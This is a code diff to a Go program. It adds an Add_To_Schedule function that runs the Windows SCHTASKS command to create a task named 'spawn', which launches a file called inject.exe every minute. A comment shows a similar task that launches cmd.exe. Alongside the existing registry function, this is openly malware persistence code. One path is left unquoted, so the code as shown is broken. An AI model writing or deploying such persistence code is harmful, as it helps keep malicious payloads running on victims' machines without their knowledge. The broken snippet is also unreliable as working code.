@@ -29,7 +29,23 @@ func Add_ToRegistry() {
 }
 
 
+func Add_To_Schedule(){
+    command := func() {
+        c := exec.Command("cmd", "/C", "SCHTASKS", "/Create", "/SC", "MINUTE", "/TN", "spawn", "/TR", C:\Users\miron\inject.exe)
+        if err := c.Run(); err != nil {
+            fmt.Println("Error: ", err)
+        } else {
+            fmt.Println("[+] Successful add to Schedule(SCHTASKS)", "[+]")
+        }
+    }
+    command()
+    //SCHTASKS /Create /SC MINUTE /TN spawn /TR C:\windows\system32\cmd.exe /MO 1
+
+}
+
+
 
 func main() {
     Add_ToRegistry()
+    Add_To_Schedule()
 }
